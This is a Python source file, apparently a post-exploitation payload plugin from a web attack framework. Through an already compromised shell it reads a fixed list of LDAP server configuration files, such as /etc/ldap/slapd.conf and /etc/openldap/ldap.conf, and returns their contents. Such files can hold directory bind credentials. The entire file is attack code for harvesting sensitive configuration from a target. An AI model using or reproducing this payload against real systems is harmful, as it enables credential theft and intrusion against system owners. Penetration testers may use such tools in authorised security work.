import re
from plugins.attack.payloads.base_payload import base_payload

class ldap_config_files(base_payload):
    '''
    This payload shows LDAP configuration files
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/ldap/slapd.conf')
        files.append('/etc/openldap/slapd.conf')
        files.append('/etc/openldap/ldap.conf')
        files.append('/etc/ldap/myslapd.conf')
        files.append('/etc/ldap/lapd.conf')

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result
        
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('LDAP Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('LDAP configuration files not found.')
        return result
        
